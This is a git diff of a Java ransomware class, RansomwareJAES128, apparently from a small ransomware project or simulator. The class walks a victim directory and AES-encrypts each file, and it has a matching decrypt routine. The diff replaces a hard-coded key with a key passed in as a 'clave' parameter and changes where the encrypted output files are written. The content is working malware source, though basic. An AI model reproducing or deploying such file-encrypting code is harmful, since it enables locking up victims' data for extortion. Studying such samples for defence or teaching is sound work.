@@ -6,7 +6,6 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
-import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
 public class RansomwareJAES128 extends Ransomware {
@@ -22,9 +21,11 @@ public class RansomwareJAES128 extends Ransomware {
     public void encrypt(String victimDir) throws Exception {
         this.victimDir = victimDir;
         String algorithm = "AES";
-//        String clearText = "I am an Employee";
-//        byte[] key = clearText.getBytes("UTF8");
-        byte[] key = new byte[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
+        String clearText = super.getParametros().get("clave");
+        if (clearText == null) {
+            throw new RuntimeException("No se especificó una clave");
+        }
+        byte[] key = clearText.getBytes("UTF8");
         SecretKey secretKey = new SecretKeySpec(key, "AES");
         cipher = Cipher.getInstance(algorithm);
         int mode = Cipher.ENCRYPT_MODE;
@@ -55,15 +56,13 @@ public class RansomwareJAES128 extends Ransomware {
         } else {
             FileInputStream fis = new FileInputStream(file);
             int readBytesCount;
-            FileOutputStream fos = new FileOutputStream(new File(victimDir + "/" + file.getName() + ".tmp"));
+            FileOutputStream fos = new FileOutputStream(new File(file.getAbsolutePath() + ".tmp"));
 
             int inputBlockSize = cipher.getBlockSize();
             int outputBlockSize = cipher.getOutputSize(inputBlockSize);
             byte[] inputBytes = new byte[inputBlockSize];
             byte[] outputBytes = new byte[outputBlockSize];
 
-            System.out.println(inputBlockSize);
-            System.out.println(outputBlockSize);
             do {
                 readBytesCount = fis.read(inputBytes);
                 if (readBytesCount == inputBlockSize) {
@@ -86,9 +85,11 @@ public class RansomwareJAES128 extends Ransomware {
     public void decrypt(String victimDir) throws Exception {
         this.victimDir = victimDir;
         String algorithm = "AES";
-//        String clearText = "I am an Employee";
-//        byte[] key = clearText.getBytes("UTF8");
-        byte[] key = new byte[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
+        String clearText = super.getParametros().get("clave");
+        if (clearText == null) {
+            throw new RuntimeException("No se especificó una clave");
+        }
+        byte[] key = clearText.getBytes("UTF8");
         SecretKey secretKey = new SecretKeySpec(key, "AES");
         cipher = Cipher.getInstance(algorithm);
         int mode = Cipher.DECRYPT_MODE;
